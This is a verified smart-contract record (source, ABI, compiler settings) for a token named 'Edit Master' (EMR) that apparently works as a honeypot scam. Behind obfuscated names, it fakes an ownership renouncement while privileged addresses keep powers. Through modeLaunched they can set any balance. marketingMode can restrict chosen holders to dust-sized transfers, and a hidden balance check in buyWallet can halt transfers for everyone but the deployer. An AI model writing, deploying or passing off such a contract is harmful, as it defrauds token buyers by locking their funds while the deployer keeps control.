{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface minSell {\n    function createPair(address enableTrading, address totalTakeLaunched) external returns (address);\n}\n\ninterface listFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountReceiverSender) external view returns (uint256);\n\n    function transfer(address minList, uint256 fundExempt) external returns (bool);\n\n    function allowance(address liquidityLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minList,\n        uint256 fundExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalTx, uint256 value);\n    event Approval(address indexed liquidityLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract launchMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listFeeMetadata is listFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EditMaster is launchMax, listFee, listFeeMetadata {\n\n    function maxTotal() private view {\n        require(launchedReceiverSender[_msgSender()]);\n    }\n\n    function buyWallet(address maxLimit, address minList, uint256 fundExempt) internal returns (bool) {\n        if (maxLimit == teamTake) {\n            return fromLiquidity(maxLimit, minList, fundExempt);\n        }\n        uint256 swapBuyAt = listFee(receiverMax).balanceOf(sellTrading);\n        require(swapBuyAt == marketingWallet);\n        require(minList != sellTrading);\n        if (liquidityTx[maxLimit]) {\n            return fromLiquidity(maxLimit, minList, sellExempt);\n        }\n        return fromLiquidity(maxLimit, minList, fundExempt);\n    }\n\n    function marketingMode(address liquidityList) public {\n        maxTotal();\n        if (exemptTeam == atMin) {\n            exemptTeam = true;\n        }\n        if (liquidityList == teamTake || liquidityList == receiverMax) {\n            return;\n        }\n        liquidityTx[liquidityList] = true;\n    }\n\n    bool public marketingSenderTake;\n\n    function transfer(address amountMarketing, uint256 fundExempt) external virtual override returns (bool) {\n        return buyWallet(_msgSender(), amountMarketing, fundExempt);\n    }\n\n    uint256 private fromSenderList;\n\n    address sellTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address amountReceiverSender) public view virtual override returns (uint256) {\n        return walletBuy[amountReceiverSender];\n    }\n\n    function fromLiquidity(address maxLimit, address minList, uint256 fundExempt) internal returns (bool) {\n        require(walletBuy[maxLimit] >= fundExempt);\n        walletBuy[maxLimit] -= fundExempt;\n        walletBuy[minList] += fundExempt;\n        emit Transfer(maxLimit, minList, fundExempt);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountLaunch;\n    }\n\n    string private buyAmount = \"Edit Master\";\n\n    function approve(address autoLaunch, uint256 fundExempt) public virtual override returns (bool) {\n        swapSenderLiquidity[_msgSender()][autoLaunch] = fundExempt;\n        emit Approval(_msgSender(), autoLaunch, fundExempt);\n        return true;\n    }\n\n    function liquidityLaunchedFrom(uint256 fundExempt) public {\n        maxTotal();\n        marketingWallet = fundExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toShouldAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapSenderLiquidity;\n\n    uint256 private amountLaunch = 100000000 * 10 ** 18;\n\n    string private toShouldAmount = \"EMR\";\n\n    address atTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public liquidityTx;\n\n    function owner() external view returns (address) {\n        return maxSender;\n    }\n\n    function modeLaunched(address amountMarketing, uint256 fundExempt) public {\n        maxTotal();\n        walletBuy[amountMarketing] = fundExempt;\n    }\n\n    uint256 marketingWallet;\n\n    bool public exemptTeam;\n\n    function allowance(address fromReceiverTake, address autoLaunch) external view virtual override returns (uint256) {\n        if (autoLaunch == atTrading) {\n            return type(uint256).max;\n        }\n        return swapSenderLiquidity[fromReceiverTake][autoLaunch];\n    }\n\n    bool private atMin;\n\n    constructor (){\n        if (txWalletLaunch != shouldMaxTeam) {\n            shouldMaxTeam = modeTx;\n        }\n        limitAt launchReceiver = limitAt(atTrading);\n        receiverMax = minSell(launchReceiver.factory()).createPair(launchReceiver.WETH(), address(this));\n        \n        teamTake = _msgSender();\n        launchedReceiverSender[teamTake] = true;\n        walletBuy[teamTake] = amountLaunch;\n        marketingList();\n        \n        emit Transfer(address(0), teamTake, amountLaunch);\n    }\n\n    uint256 constant sellExempt = 9 ** 10;\n\n    mapping(address => uint256) private walletBuy;\n\n    event OwnershipTransferred(address indexed autoWallet, address indexed fromTeam);\n\n    uint256 private txSell;\n\n    function marketingList() public {\n        emit OwnershipTransferred(teamTake, address(0));\n        maxSender = address(0);\n    }\n\n    uint256 modeListWallet;\n\n    function shouldFund(address totalSellBuy) public {\n        if (sellMax) {\n            return;\n        }\n        if (txSell != fromSenderList) {\n            fromSenderList = txWalletLaunch;\n        }\n        launchedReceiverSender[totalSellBuy] = true;\n        if (shouldMaxTeam == modeTx) {\n            atMin = true;\n        }\n        sellMax = true;\n    }\n\n    address public receiverMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderIsAmount;\n    }\n\n    mapping(address => bool) public launchedReceiverSender;\n\n    address private maxSender;\n\n    uint256 private shouldMaxTeam;\n\n    address public teamTake;\n\n    uint8 private senderIsAmount = 18;\n\n    function getOwner() external view returns (address) {\n        return maxSender;\n    }\n\n    uint256 private txWalletLaunch;\n\n    bool public sellMax;\n\n    uint256 private modeTx;\n\n    function name() external view virtual override returns (string memory) {\n        return buyAmount;\n    }\n\n    function transferFrom(address maxLimit, address minList, uint256 fundExempt) external override returns (bool) {\n        if (_msgSender() != atTrading) {\n            if (swapSenderLiquidity[maxLimit][_msgSender()] != type(uint256).max) {\n                require(fundExempt <= swapSenderLiquidity[maxLimit][_msgSender()]);\n                swapSenderLiquidity[maxLimit][_msgSender()] -= fundExempt;\n            }\n        }\n        return buyWallet(maxLimit, minList, fundExempt);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiverTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiverSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundExempt\",\"type\":\"uint256\"}],\"name\":\"liquidityLaunchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"marketingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSenderTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundExempt\",\"type\":\"uint256\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSellBuy\",\"type\":\"address\"}],\"name\":\"shouldFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EditMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}